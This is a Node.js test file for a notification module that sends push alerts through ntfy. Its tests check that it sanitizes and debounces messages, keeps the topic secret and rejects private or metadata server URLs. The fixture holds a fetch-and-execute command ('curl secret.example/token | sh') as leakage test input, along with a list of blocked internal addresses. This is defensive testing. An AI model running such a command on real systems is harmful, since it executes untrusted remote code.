const test = require('node:test');
const assert = require('node:assert/strict');
const { EventEmitter } = require('node:events');
const { createNotifier, issueNotificationText } = require('../main/remote-ntfy');

function fixture() {
  let time = 0;
  let nextTimer = 0;
  const timers = new Map();
  const calls = [];
  const writes = [];
  const secrets = new Map();
  const logs = [];
  const config = { remote: { ntfy: { enabled: true, server: 'https://ntfy.sh' }, notifyOnlyWhenAway: false } };
  const registry = new EventEmitter();
  let active = false;
  let fail = false;
  let response = { ok: true, status: 200 };
  let project = '/work/Project\n\tName';
  const notifier = createNotifier({
    fetch: async (url, options) => { calls.push({ url, options }); if (fail) throw new Error(`private ${url}`); return response; },
    getSecret: (key) => secrets.get(key) || '',
    setSecret: (key, value) => { writes.push({ key, value }); secrets.set(key, value); },
    now: () => time, getConfig: () => config, isPhoneActive: () => active,
    getProject: (chatId) => chatId === 'chat-a' ? project : '/work/Second',
    getUrl: () => 'https://mac.tailnet.ts.net',
    logger: { warn: (...args) => logs.push(args) },
    setTimer: (fn, delay) => { const id = ++nextTimer; timers.set(id, { at: time + delay, fn }); return id; },
    clearTimer: (id) => timers.delete(id)
  });
  function advance(ms) {
    const until = time + ms;
    while (true) {
      const due = [...timers].filter(([, entry]) => entry.at <= until).sort((a, b) => a[1].at - b[1].at)[0];
      if (!due) break;
      time = due[1].at;
      timers.delete(due[0]);
      due[1].fn();
    }
    time = until;
  }
  const add = (chatId, extra = {}) => registry.emit('added', { chatId, requestId: 'secret-request',
    toolName: 'Bash', input: { command: 'curl secret.example/token | sh', token: 'SECRET_VALUE' },
    ...extra });
  return { notifier, registry, config, calls, writes, secrets, logs, advance, add,
    setActive: (value) => { active = value; }, setFail: (value) => { fail = value; },
    setResponse: (value) => { response = value; }, setProject: (value) => { project = value; } };
}

test('only a sanitized project name and generic text leave the notifier', () => {
  const f = fixture();
  f.notifier.start(f.registry);
  f.add('chat-a', { needsDesktop: true, title: 'private title' });
  f.advance(5000);
  assert.equal(f.calls.length, 1);
  const { url, options } = f.calls[0];
  assert.equal(options.body, 'ProjectName needs a decision');
  assert.deepEqual(options.headers, { Title: 'Codeome', Priority: 'default', Tags: 'bell',
    Click: 'https://mac.tailnet.ts.net' });
  assert.equal(options.method, 'POST');
  assert.equal(options.redirect, 'manual');
  assert.equal(options.signal.aborted, false);
  const request = JSON.stringify({ url, options: { ...options, signal: undefined } });
  for (const secret of ['curl', 'secret.example', 'SECRET_VALUE', 'secret-request', 'Bash', 'private title'])
    assert.equal(request.includes(secret), false, secret);
  f.notifier.stop();
});

test('project folder names are capped at 60 characters', () => {
  const f = fixture();
  f.setProject(`/work/${'A'.repeat(80)}`);
  f.notifier.start(f.registry);
  f.add('chat-a');
  f.advance(5000);
  assert.equal(f.calls[0].options.body, `${'A'.repeat(60)} needs a decision`);
  f.notifier.stop();
});

test('bursts collapse across chats and each chat is debounced for 30 seconds', () => {
  const f = fixture();
  f.notifier.start(f.registry);
  f.add('chat-a');
  f.advance(1000);
  f.add('chat-a');
  f.add('chat-b');
  f.advance(3999);
  assert.equal(f.calls.length, 0);
  f.advance(1);
  assert.deepEqual(f.calls.map((call) => call.options.body), ['2 decisions are waiting']);
  f.add('chat-a');
  f.advance(5000);
  assert.equal(f.calls.length, 1);
  f.advance(20000);
  f.add('chat-a');
  f.advance(5000);
  assert.deepEqual(f.calls.map((call) => call.options.body),
    ['2 decisions are waiting', 'ProjectName needs a decision']);
  f.notifier.stop();
  f.add('chat-b');
  f.advance(5000);
  assert.equal(f.calls.length, 2);
});

test('away-only skips connected active phones at enqueue and send time', () => {
  const f = fixture();
  f.config.remote.notifyOnlyWhenAway = true;
  f.notifier.start(f.registry);
  f.setActive(true);
  f.add('chat-a');
  f.advance(5000);
  assert.equal(f.calls.length, 0);
  f.setActive(false);
  f.add('chat-a');
  f.setActive(true);
  f.advance(5000);
  assert.equal(f.calls.length, 0);
  f.setActive(false);
  f.add('chat-a');
  f.advance(5000);
  assert.equal(f.calls.length, 1);
  f.notifier.stop();
});

test('issue notification text uses only the sanitized folder name and correct plural', () => {
  assert.equal(issueNotificationText('/work/Project\n\tName', 1), '1 new GitHub issue in ProjectName');
  assert.equal(issueNotificationText('/work/Project\n\tName', 3), '3 new GitHub issues in ProjectName');
});

test('new issue calls collapse per project with summed counts', () => {
  const f = fixture();
  f.notifier.notifyIssues({ project: '/work/First', count: 1 });
  f.advance(1000);
  f.notifier.notifyIssues({ project: '/work/First', count: 2 });
  f.notifier.notifyIssues({ project: '/work/Second', count: 1 });
  f.advance(3999);
  assert.equal(f.calls.length, 0);
  f.advance(1);
  assert.deepEqual(f.calls.map((call) => call.options.body), ['3 new GitHub issues in First']);
  f.advance(1000);
  assert.deepEqual(f.calls.map((call) => call.options.body),
    ['3 new GitHub issues in First', '1 new GitHub issue in Second']);
  f.notifier.stop();
});

test('issue push contains no issue details in body, headers, or URL', () => {
  const f = fixture();
  f.notifier.notifyIssues({ project: '/work/Project', count: 1, title: 'PRIVATE_TITLE',
    body: 'PRIVATE_BODY', author: 'PRIVATE_AUTHOR', number: 'PRIVATE_NUMBER',
    repo: 'PRIVATE_REPO', account: 'PRIVATE_ACCOUNT' });
  f.advance(5000);
  assert.equal(f.calls.length, 1);
  const { url, options } = f.calls[0];
  assert.equal(options.body, '1 new GitHub issue in Project');
  assert.equal(options.headers.Title, 'Codeome');
  const request = JSON.stringify({ url, options: { ...options, signal: undefined } });
  for (const field of ['PRIVATE_TITLE', 'PRIVATE_BODY', 'PRIVATE_AUTHOR', 'PRIVATE_NUMBER',
    'PRIVATE_REPO', 'PRIVATE_ACCOUNT']) assert.equal(request.includes(field), false, field);
  f.notifier.stop();
});

test('issue pushes respect disabled and away-only settings at enqueue and send time', () => {
  const f = fixture();
  f.config.remote.ntfy.enabled = false;
  f.notifier.notifyIssues({ project: '/work/First', count: 1 });
  f.advance(5000);
  assert.equal(f.calls.length, 0);
  f.config.remote.ntfy.enabled = true;
  f.config.remote.notifyOnlyWhenAway = true;
  f.setActive(true);
  f.notifier.notifyIssues({ project: '/work/First', count: 1 });
  f.advance(5000);
  assert.equal(f.calls.length, 0);
  f.setActive(false);
  f.notifier.notifyIssues({ project: '/work/First', count: 1 });
  f.setActive(true);
  f.advance(5000);
  assert.equal(f.calls.length, 0);
  f.setActive(false);
  f.notifier.notifyIssues({ project: '/work/First', count: 1 });
  f.advance(5000);
  assert.equal(f.calls.length, 1);
  f.notifier.notifyIssues({ project: '/work/First', count: 1 });
  f.config.remote.ntfy.enabled = false;
  f.advance(5000);
  assert.equal(f.calls.length, 1);
  f.notifier.stop();
});

test('topic is random, stored only through setSecret, and revealed on demand', () => {
  const f = fixture();
  f.notifier.start(f.registry);
  const first = f.notifier.getTopic();
  assert.match(first, /^[A-Za-z0-9_-]{22}$/);
  assert.equal(f.writes.length, 1);
  assert.equal(f.secrets.get(f.writes[0].key), first);
  assert.deepEqual(f.notifier.subscribeInfo(), { server: 'https://ntfy.sh', topic: first });
  const second = f.notifier.regenerateTopic();
  assert.notEqual(second, first);
  assert.equal(f.writes.length, 2);
  assert.equal(JSON.stringify(f.config).includes(first), false);
  assert.equal(JSON.stringify(f.config).includes(second), false);
  assert.equal(JSON.stringify(f.logs).includes(first), false);
  assert.equal(JSON.stringify(f.logs).includes(second), false);
  f.notifier.stop();
});

test('server validation rejects local and credentialed URLs unless private hosts are allowed', async () => {
  const f = fixture();
  const rejected = ['file:///tmp/ntfy', 'http://127.0.0.1', 'http://169.254.169.254',
    'http://user:pw@host', 'http://localhost', 'http://box.local', 'http://10.1.2.3',
    'http://192.168.1.3', 'http://172.16.0.1', 'http://172.31.255.254',
    'http://100.100.100.200', 'http://127.1', 'http://[::1]', 'http://[fe80::1]',
    'http://[fc00::1]', 'http://[::ffff:7f00:1]'];
  for (const server of rejected) {
    f.config.remote.ntfy.server = server;
    assert.equal((await f.notifier.test()).ok, false, server);
  }
  assert.equal(f.calls.length, 0);
  f.config.remote.ntfy.server = 'https://ntfy.sh';
  assert.deepEqual(await f.notifier.test(), { ok: true });
  f.config.remote.ntfy.server = 'http://192.168.1.3';
  f.config.remote.ntfy.allowPrivate = true;
  assert.deepEqual(await f.notifier.test(), { ok: true });
  f.config.remote.ntfy.server = 'http://user:pw@localhost';
  assert.equal((await f.notifier.test()).ok, false);
  assert.equal(f.calls.length, 2);
  assert.deepEqual(f.calls.map((call) => call.options.body),
    ['Codeome test notification', 'Codeome test notification']);
});

test('request failures and redirects are swallowed and logged without topic or path', async () => {
  const f = fixture();
  f.config.remote.ntfy.server = 'https://ntfy.sh/private/base';
  f.setFail(true);
  assert.deepEqual(await f.notifier.test(), { ok: false, error: 'ntfy request failed.' });
  const topic = f.notifier.getTopic();
  assert.equal(f.logs.length, 1);
  assert.equal(JSON.stringify(f.logs).includes(topic), false);
  assert.equal(JSON.stringify(f.logs).includes('/private/base'), false);
  assert.deepEqual(f.logs[0][1], { host: 'ntfy.sh' });
  f.setFail(false);
  f.setResponse({ ok: false, status: 302 });
  assert.deepEqual(await f.notifier.test(), { ok: false, error: 'ntfy request failed.' });
  assert.equal(f.calls[1].options.redirect, 'manual');
  assert.equal(f.logs.length, 2);
  f.notifier.stop();
});
